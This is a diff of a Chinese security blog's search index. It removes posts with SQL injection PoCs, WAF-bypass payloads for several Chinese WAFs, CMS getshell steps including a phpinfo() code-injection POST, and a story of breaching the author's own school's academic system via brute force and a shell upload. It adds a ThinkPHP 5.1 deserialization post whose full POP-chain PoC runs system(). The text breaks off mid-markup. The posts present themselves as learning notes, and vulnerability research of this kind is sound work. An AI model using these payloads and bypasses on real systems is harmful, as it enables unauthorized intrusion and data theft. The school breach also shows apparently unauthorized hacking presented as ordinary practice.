@@ -1,265 +1,159 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title> PbootCMS—前台首页注入</title>
-    <url>/2021/01/07/seven/</url>
-    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>
-
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><pre><code>个人学习记录</code></pre><h4 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h4><p>搭建好环境后，访问首页</p>
-<p><img src="https://pic.downk.cc/item/5ff6bbd83ffa7d37b3258e87.jpg" alt=""></p>
-<p>poc：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ext_price%0a)%0aand%0a(updatexml(1,concat(0x3a,&quot;---&quot;,(select%0auser())),1))%23%27</span><br></pre></td></tr></table></figure>
-
-<p>直接访问</p>
-<p><img src="https://pic.downk.cc/item/5ff6bc113ffa7d37b325cd03.jpg" alt=""></p>
-<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>漏洞入口文件：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apps&#x2F;home&#x2F;controller&#x2F;IndexController.php</span><br></pre></td></tr></table></figure>
-
-<p>关键代码在    parserAfter方法内，跟踪进去</p>
-<p><img src="https://pic.downk.cc/item/5ff6bca03ffa7d37b3267476.jpg" alt=""></p>
-<p>进入之后可以看到</p>
-<p>$content = $this-&gt;parserSpecifyListLabel($content);方法</p>
-<p><img src="https://pic.downk.cc/item/5ff6bd5f3ffa7d37b3274646.jpg" alt=""></p>
-<p>进入此方法</p>
-<p>在1115-1118行可以看到，这里接收了GET类型内容，只要前缀是ext_，就会把key值赋值给$where2</p>
-<p>(小注释：get() 是此框架自定义的接受GET类型参数的函数，且有过滤，但是只会过滤数组的value，并不会过滤key)</p>
-<p><img src="https://pic.downk.cc/item/5ff6bdc43ffa7d37b327b973.jpg" alt=""></p>
-<p>之后，我们向下走，</p>
-<p>在1170行，进入到另一个关键方法 getSpecifyList</p>
-<p>跟踪进入</p>
-<p><img src="https://pic.downk.cc/item/5ff6be8b3ffa7d37b328a129.jpg" alt=""></p>
-<p><img src="https://pic.downk.cc/item/5ff6bed33ffa7d37b328fdb6.jpg" alt=""></p>
-<p>关键代码在 第381行，$where 即我们可以控制的内容。可以看到直接带入到了where方法根据where方法</p>
-<p><img src="https://pic.downk.cc/item/5ff6befa3ffa7d37b3292a73.jpg" alt=""></p>
-<p>可以看到直接拼接了sql语句并没有过滤</p>
-<p><img src="https://pic.downk.cc/item/5ff6bf8c3ffa7d37b329dc78.jpg" alt=""></p>
-<h4 id="完"><a href="#完" class="headerlink" title="完"></a>完</h4>]]></content>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何编写自己的绕waf-tamper脚本</title>
-    <url>/2020/08/25/six/</url>
-    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>
-
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><pre><code>之前在某个群里，看到有个师傅问云锁怎么绕，后来自己尝试bypass云锁的sql注入由此，有了一下的文章</code></pre><h4 id="过狗篇章"><a href="#过狗篇章" class="headerlink" title="过狗篇章"></a>过狗篇章</h4><p>测试环境：</p>
-<pre><code>wamp(php5.6+mysql5.7+apache)
-
-sqli-labs</code></pre><p>搭建好sqli-labs后启动安全狗</p>
-<p><img src="https://i.loli.net/2020/07/20/zS3M8bqVTQ6ZRuJ.png" alt="图片.png"></p>
-<p>ok，之后就是尝试构造绕过语句，安全狗还是挺好过的，我这里使用的换行符号绕过</p>
-<p>直接上payload：union+%0A%23aaa%0Aselect+1,2,3%20%23</p>
-<p><img src="https://i.loli.net/2020/07/20/MX2ldPsCTU1pujw.png" alt="图片.png"></p>
-<p>​    </p>
-<p>成功绕过，然后我们就可以基于此规则写出一个绕过安全狗的sqlmap的tamper</p>
-<p>先直接看成品</p>
-<p><img src="https://i.loli.net/2020/07/20/RyXQBeAEHhSZCVz.png" alt="图片.png"></p>
-<p>进行注入测试</p>
-<p><img src="https://i.loli.net/2020/07/20/u9LfWcbQw5E4xIk.png" alt="图片.png">)<img src="https://i.loli.net/2020/07/20/TA8h1LnQqSpWc43.png" alt="图片.png"></p>
-<p>关于tamper脚本，简单说明下就是，前面的我们不用动，那些基本就是写导入库已经必要的声明之类的，我们只需主要修改的就是tamper函数下面的payload这个变量。想要详细了解tamper编写的师傅可以去看看官方手册。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;payload.replace(&#39;1&#39;,&#39;2&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>在此代码里，第一个参数输入sql注入的原语句，第二个参数，改为我们绕过形式的语句就ok。</p>
-<p>(小提醒：sqlmap的sql注入语句一般都是为大写，所以在编写的时候注意下大小写问题)</p>
-<h4 id="过盾篇"><a href="#过盾篇" class="headerlink" title="过盾篇"></a>过盾篇</h4><pre><code>环境
-
-win server2008+php+sqliab+d_safe_2.1.5.4</code></pre><p><img src="https://i.loli.net/2020/07/21/26wPhrVQ3NIsZuR.png" alt="图片.png"></p>
-<p>运行正常。这里和过狗有些差别，因为d盾他过滤内联注释/<em>*/、/</em>!*/等，并且他也过滤了换行符等一些特殊符号，最后fuzz 出来发现 他只对%A0不敏感。</p>
-<p>先直接上payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php&#x2F;?id&#x3D;1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&#39;union%A0select@1,2,table_name+from+information_schema.TABLES+where+TABLE_SCHEMA+like+database()%23</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/07/21/ytTFRQ82vBLlUEi.png" alt="图片.png"></p>
-<p>这里说明一下，为什么会填充很多字符，理由就是 如果不填充，你在get类型下就算只输入一个单引号他都会拦截，(离谱)</p>
-<p><img src="https://i.loli.net/2020/07/21/fRP1ABTSezXjiJq.png" alt="图片.png"></p>
-<p>所以需要填充字符来绕过，并且他会拦截=号这里可以用like 代替问题不大</p>
-<p>编写tamper：</p>
-<pre><code>马赛克</code></pre><h4 id="360webscan篇："><a href="#360webscan篇：" class="headerlink" title="360webscan篇："></a>360webscan篇：</h4><p>测试环境：</p>
-<pre><code>wamp+sqliab</code></pre><p><img src="https://i.loli.net/2020/07/21/UPuRNkI8WZDEYsz.png" alt="图片.png"></p>
-<p>搭建成功</p>
-<p>这里我依旧是使用的换行符来进行绕过的，他和d盾一样禁用内联注释，只要出现就被拦，但是规则相比d盾简单些能用的特殊符号多些</p>
-<p>先想payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0Aunion%0Aselect-1,concat_ws(&#39;&#39;,table_name),3 from information_schema.TABLES where TABLE_SCHEMA&#x3D;database()%23</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/07/21/qED8cPXkgG1n9fa.png" alt="图片.png"></p>
-<p>绕过规则就是在每个函数前面加上%0a、%A0很简单的思路，编写tamper</p>
-<p>先看成品：</p>
-<p><img src="https://i.loli.net/2020/07/21/EZ74GoMmlxFSfta.png" alt="图片.png"></p>
-<p><img src="https://i.loli.net/2020/07/21/jApxrTulP3V7v2N.png" alt="图片.png"></p>
-<p>ok</p>
-<h4 id="过云锁"><a href="#过云锁" class="headerlink" title="过云锁"></a>过云锁</h4><p>测试环境:</p>
-<p>win server 2012+phpstudy+sqliab</p>
-<p>运行正常</p>
-<p><img src="https://i.loli.net/2020/07/22/vWEo2Rz7KLQIMbB.png" alt="图片.png"></p>
-<p>在测试的时候发现，他主要对于联合查询拦截的很敏感，但是相对对于其他的查询类型不怎么严格，</p>
-<p>先上payload来观察：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%26%26(&#96;updatexml&#96;(1,concat(0x3a,&quot;---&quot;,(select user&#x2F;**&#x2F;())),1))%23</span><br><span class="line">&#x2F;&#x2F;bool注入</span><br><span class="line">%7c%7c substr((select user&#x2F;**&#x2F;()),1,1)&#x3D;&quot;r&quot;%23</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://i.loli.net/2020/07/22/ikEgmx3lbfaVZn8.png" alt="图片.png"></p>
-<p><img src="https://i.loli.net/2020/07/22/PgMTK4WFkmRawjQ.png" alt="图片.png"></p>
-<p>所以我们可以针对他盲注和报错注入写tamper ，因为这样比较简单</p>
-<p>成品</p>
-<pre><code>马赛克</code></pre><p>看效果</p>
-<p><img src="https://i.loli.net/2020/07/22/9oK2FODV5Xxr8Nn.png" alt="图片.png"></p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><pre><code>waf 绕过，的方式主要还是根据不同waf 拦截的特性来的，根据不同的数据库特性，不同的系统，不同的中间件都有不同的绕过方式这里只是一个抛砖引玉的作用希望师傅们。d盾和云锁没有上tamper是因为，全发出来就没意思了，绕过方式已经给出来，编写就交给师傅们了。</code></pre>]]></content>
-      <tags>
-        <tag>技术讨论</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>实战记录</title>
-    <url>/2020/07/19/five/</url>
-    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe> 
-
-<p>目标是我的学校一个教务系统。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710205835-10a6ad6c-c2ad-1.png" alt="图片.png"><br>青果的，网上找了找了漏洞，无果。在前期，信息搜集的时候发现开放了8000端口访问看看</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210120-7346270e-c2ad-1.png" alt="图片.png"></p>
-<p>这熟悉的报错界面 ，该死的甜美，本着某蟑螂(小强)的精神，我fuzz了目录，发现存在一个doc目录</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210253-aa6f084a-c2ad-1.png" alt="图片.png"><br>没有验证码，仿佛就是告诉你快来淦(爆破)我啊一样<br>掏出burp，爆破，运气还不错。一发入魂（跑出来admin账户）</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210450-f0028c92-c2ad-1.png" alt="图片.png"><br>但是 进来后发现，这xx管理员的功能少的可怜，连个上传点都没有，注入点也没有<br>后来想了想，既然是教学系统那教师肯定有上传点，因为需要判卷，上传课题，汇报工作等等啥的</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210742-56f5fa2e-c2ae-1.png" alt="图片.png"><br>有教师用户随便登录一个<br>结果就是不出所料的确实有上传点</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210823-6f5f6c6c-c2ae-1.png" alt="图片.png"><br>在模板管理处有上传点</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710211111-d3a55498-c2ae-1.png" alt="图片.png"><br>上传测试的时候发现是白名单，但是他除了文件名的时候并不会改名字，最后配合iis6解析漏洞拿下此系统</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710211318-1eea3324-c2af-1.png" alt="图片.png"></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710211427-483e7db6-c2af-1.png" alt="图片.png"><br>文末（一路上几乎没有什么技术上的坑算是一篇水文，shell已删除）</p>
-]]></content>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DM-cms后台getshell</title>
-    <url>/2020/04/28/four/</url>
-    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>  
-
-
-<p><strong>漏洞触发点</strong></p>
-<p><code>http://www.xxx.cn/admindm-yourname/mod_module/mod_importdata.php?lang=cn</code><br><img src="https://i.loli.net/2020/05/16/xz4tlyAJq5QuBUo.jpg" alt="1.jpg"><br>我们先去模板管理—》模板管理<br><a href="http://www.cc.com/admindm-yourname/mod_style/mod_style.php?lang=cn" target="_blank" rel="noopener">http://www.cc.com/admindm-yourname/mod_style/mod_style.php?lang=cn</a><br><img src="https://i.loli.net/2020/05/16/xmhnpNXOM6Z8Yuj.jpg" alt="2.jpg"><br>点击修改css样式然后插入php代码，然后提交<br><img src="https://i.loli.net/2020/05/16/Cen2BTbdpP5Gh6v.jpg" alt="3.jpg"><br>复制这个路径然后回到，最初的漏洞触发点输入<br><img src="https://i.loli.net/2020/05/16/aTvGNQgXkFBL7o5.jpg" alt="5jpg.jpg"><br>../../DM-static/assets/cssjstpl/style20160721_0855323118.css（之前复制的css文件路径）<br><img src="https://i.loli.net/2020/05/16/6DuvkenH7mlF5cb.jpg" alt="6.jpg"><br>点击提交<br><img src="https://i.loli.net/2020/05/16/52YHhwBM4OkLf96.jpg" alt="11.jpg"></p>
-]]></content>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>thinkphp6任意文件写入</title>
-    <url>/2020/04/03/three/</url>
-    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>
-Thinkphp6:任意文件写入<br>
-版本：v6.0.0-v6.0.1<br>
-复现过程：<br>
-下载配置好tp6 然后 ，在\tp6\app\controller\Index.php&nbsp;中。写好，漏洞代码。<br>
-<img src="https://s1.ax1x.com/2020/04/03/GawC8O.png" alt="GawC8O.png" border="0" /><br>
-然后再去，tp6\app\middleware.php中吧session 写入打开<br>
-<img src="https://s1.ax1x.com/2020/04/03/GawmIP.png" alt="GawmIP.png" border="0" /><br>
-访问index 控制器,查看<br>
-<img src="https://s1.ax1x.com/2020/04/03/Gaw8qs.png" alt="Gaw8qs.png" border="0" /><br>
-打开正常，传入a 参数并且抓包<br>
-<img src="https://s1.ax1x.com/2020/04/03/GawUiV.png" alt="GawUiV.png" border="0" /><br>
-在a参数写入php代码。Phpsessid 写入一个文件名和路径总长度32位的内容。<br>
-发送<br>
-<img src="https://s1.ax1x.com/2020/04/03/GawcIx.png" alt="GawcIx.png" border="0" /><br>
-成功写入<br>
-漏洞分析：<br>
-根据网上信息漏洞位置在:<br>
-tp6/vendor/topthink/framework/src/think/session/Store.php<br>
-所以我们直接定位到漏洞位置：<br>
-<img src="https://s1.ax1x.com/2020/04/03/GawLJf.png" alt="GawLJf.png" border="0" /><br>
-判断phpsessid的值是否是字符串并且是否长度为32<br>
-向下走，找到session保存的位置：<br>
-<img src="https://s1.ax1x.com/2020/04/03/Ga09wn.png" alt="Ga09wn.png" border="0" /><br>
-<p>关键代码就是 259-261，这里他判断session的值如果不为空就是进行序列化然后写入.其中也没有过滤。所以如果session 的值 我们能控制 （就比如图1那样），就会直接造成一个任意文件写入的漏洞。</p>
-（在src/think/middleware/SessionInit.php文件里有phpsessid的获取方法。这里就不追了，有兴趣的可以自己去查看）<br>
-]]></content>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>phpyun 后台getshell</title>
-    <url>/2020/04/02/two/</url>
-    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>
-<p>
-漏洞名称：PHPYUN&nbsp;cms后台存在代码执行</br>
-漏洞版本号： V4.5 Beta</br>
-漏洞官网：https://www.phpyun.com/</br>
-</p>
-<div>
-    <p>Poyload:
-                Url：<br>
-        http://www.cc.com/admin/index.php?m=database&c=backup
-        <br>
-        Post：
-        pytoken=3c3140b58f5e&table[]=]=1;phpinfo();//&maxfilesize=1111<br>
-    </p>
-    复现过程：</br>
-    漏洞复现过程：<br>
-首先进入后台-》点击工具-》数据-》数据库管理-》自定义备份-》随便选择一个表-》提交备份<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJHfET.png" alt="GJHfET.png" border="0" /><br>
-抓包，修改table[] 参数-》发送<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJqEO1.png" alt="GJqEO1.png" border="0" /><br>
-<img src="https://s1.ax1x.com/2020/04/02/GJqtTf.png" alt="GJqtTf.png" border="0" /><br>
-产生的文件就在uploads/data/plus/bdata/phpyun_20200312153927/config.php
-Url：访问（这里搭建的时候环境，我默认指向了uploads）<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJq600.png" alt="GJq600.png" border="0" /><br>
-查看文件config.php<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJq5c9.png" alt="GJq5c9.png" border="0" /><br>
-漏洞审计原因：<br>
-漏洞产生文件：\phpyun\uploads\admin\model\database.class.php<br>
-第50行 ：'tablename'=>$_POST['table'] 直接接受了我们post请求发送的参数值<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJLiAf.png" alt="GJLiAf.png" border="0" /><br>
-然后56行调用了，BackupDatabaseInit() 方法，追踪该函数，<br>
-在\phpyun\uploads\app\include\dbbackup\class\functions.php，找到了该函数的定义<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJLnun.png" alt="GJLnun.png" border="0" /><br>
-产生漏洞的原因在<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJLJgJ.png" alt="GJLJgJ.png" border="0" /><br>
-这里他接收了传入的值并且没有任何过滤就写入了并且是写入的php文件，追踪$d_table 的传入来源
-可以看到是通过$tablename[$i]拼接 的到的$d_table 的值 追踪$tablename<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJLrCD.png" alt="GJLrCD.png" border="0" /><br>
-可以看到是通过函数形参传入的$add的tablename 然后赋值的来的<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJLRbt.png" alt="GJLRbt.png" border="0" /><br>
-在回到\phpyun\uploads\admin\model\database.class.php看，发现tablename 是我们可以控制的，所以传入特定的php代码即可执行<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJLXV0.png" alt="GJLXV0.png" border="0" /><br>
-漏洞修复：<br>
-在每次写入config.php文件的时候，在他目录下创建.htaccess文件禁止解析php文件<br>
-<img src="https://s1.ax1x.com/2020/04/02/GJOlqI.png" alt="GJOlqI.png" border="0" />
-</div>]]></content>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>闪灵cms重装漏洞复现</title>
-    <url>/2020/03/27/one/</url>
-    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>
-
-<p>Cms重装漏洞简介：
-一般cms都有一个install的文件用于安装cms的包括数据库信息，网站信息等但是如果没有对install这个文件做安全的校验就会出现，重装漏洞，即覆盖掉原网站。这里用闪灵cms做简单说明</p>
-<div>
-    首先，定位到install文件的位置</br>
-<a href="https://sm.ms/image/NCIGpugAaect7nO" target="_blank"><img src="https://i.loli.net/2020/03/27/NCIGpugAaect7nO.png" /></a>
-   <p> 简单解释下，第1-15行的意思，就是get接受两个参数。如果action参数的值为savepath就会返回一个后台信息和账号密码的文本，并且停止到脚本</br>
-向下走16行-20行就是 分割路径然后请求/data/config.json文件并且返回其中的id值，然后在去请求官网的api接口
-    </p>
-    继续向下走：</br>
-<a href="https://sm.ms/image/w8OT9M4ubE6KSR5" target="_blank"><img src="https://i.loli.net/2020/03/27/w8OT9M4ubE6KSR5.png" /></a></br>
-    判断step的值 如果不是4 并且step为，就会跳转回首页</br>
-
-<p><a href="https://sm.ms/image/fA3p4r9QZlkuOG7" target="_blank"><img src="https://i.loli.net/2020/03/27/fA3p4r9QZlkuOG7.png" /></a><br>    判断step的值 如果为1或者空则进入到安装页面。<br></br><br><a href="https://sm.ms/image/m1dynSiusqpIzJV" target="_blank"><img src="https://i.loli.net/2020/03/27/m1dynSiusqpIzJV.png" /></a><br>也是判断step的值为2时候进入此页面，（3 和 4 步骤同，就不贴了）</br></p>
-<p>
-至此，我们可以看到他的整体一个流程，首先get类型接收step和action的值
-如果action=savepath 就会停止脚本的运行，如果step为空 或者0 就会跳转回首页
-所以我们可以直接step=1 action=null，直接绕过限制 ，从而造成重装漏洞 
-</p>
-
-
-<p><a href="https://sm.ms/image/zsv2mliyXNaIBJp" target="_blank"><img src="https://i.loli.net/2020/03/27/zsv2mliyXNaIBJp.png" /></a></p>
-</div>
-
-
-]]></content>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
+<search> 
+  
+  
+    
+    <entry>
+      <title>thinkphp5.1.x反序列学习</title>
+      <link href="/2021/02/24/eight/"/>
+      <url>/2021/02/24/eight/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近在学习php反序列化的操作，所以简单记录下此漏洞的复现过程，个人学习记录没有什么技术。</p><h4 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h4><p>首先是搭建环境这里搭建的thinkphp5.1.37tls，关于搭建过程不做详细演示都会的东西。</p><p>搭建好之后访问主页</p><p><img src="https://img.imgdb.cn/item/603664645f4313ce256bf10b.jpg" alt=""></p><p>搭建完毕，我这里写了一个hello的方法没在里面接收data数据然后进行反序列化。使用如下poc进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append &#x3D; [];</span><br><span class="line">    private $data &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;append &#x3D; [&quot;lin&quot;&#x3D;&gt;[&quot;&quot;]];</span><br><span class="line">        $this-&gt;data &#x3D; [&quot;lin&quot;&#x3D;&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Request</span><br><span class="line">&#123;</span><br><span class="line">    protected $hook &#x3D; [];</span><br><span class="line">    protected $filter &#x3D; &quot;system&quot;;</span><br><span class="line">    protected $config &#x3D; [</span><br><span class="line">        &#x2F;&#x2F; 表单ajax伪装变量</span><br><span class="line">        &#39;var_ajax&#39;         &#x3D;&gt; &#39;_ajax&#39;,</span><br><span class="line">    ];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter &#x3D; &quot;system&quot;;</span><br><span class="line">        $this-&gt;config &#x3D; [&quot;var_ajax&quot;&#x3D;&gt;&#39;lin&#39;];</span><br><span class="line">        $this-&gt;hook &#x3D; [&quot;visible&quot;&#x3D;&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\concern\Conversion;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files &#x3D; [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files&#x3D;[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.imgdb.cn/item/6036647a5f4313ce256c24d0.jpg" alt=""></p><p>可以看到命令成功执行。</p><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>这个反序列化最初的触发点是在</p><p>/library/think/process/pipes/Windows.php的__destruct方法内，代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;close();</span><br><span class="line">    $this-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它调用了removeFiles方法，跟踪此方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private function removeFiles()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($this-&gt;files as $filename) &#123;</span><br><span class="line">        if (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;files &#x3D; [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到此方法内，使用了file_exists判断$filename存不存在，而$filename的值来自$this-&gt;files属性，这是我们可控的，这我们可以调用任意类的__toString方法，全局搜索toString方法，</p><p>最后找到一个成功找到一个可被利用的toSting方法，它是在/library/think/model/concern/Conversion.php内</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它调用了toJson方法跟踪此方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function toJson($options &#x3D; JSON_UNESCAPED_UNICODE)</span><br><span class="line">&#123;</span><br><span class="line">    return json_encode($this-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在toJson内又调用了toArray方法，跟踪此方法</p><p>因为此函数代码较多，我就直接贴关键部分的代码了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 追加属性（必须定义获取器）</span><br><span class="line">if (!empty($this-&gt;append)) &#123;</span><br><span class="line">    foreach ($this-&gt;append as $key &#x3D;&gt; $name) &#123;</span><br><span class="line">        if (is_array($name)) &#123;</span><br><span class="line">            &#x2F;&#x2F; 追加关联对象属性</span><br><span class="line">            $relation &#x3D; $this-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">            if (!$relation) &#123;</span><br><span class="line">                $relation &#x3D; $this-&gt;getAttr($key);</span><br><span class="line">                $relation-&gt;visible($name);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里首先$this-&gt;append是可控的，然后循环遍历了append，并把key，传入进了getAttr方法。跟踪getAttr方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function getAttr($name, &amp;$item &#x3D; null)</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        $notFound &#x3D; false;</span><br><span class="line">        $value    &#x3D; $this-&gt;getData($name);</span><br><span class="line">    &#125; catch (InvalidArgumentException $e) &#123;</span><br><span class="line">        $notFound &#x3D; true;</span><br><span class="line">        $value    &#x3D; null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到它调用了getData处理数据，所以继续跟</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 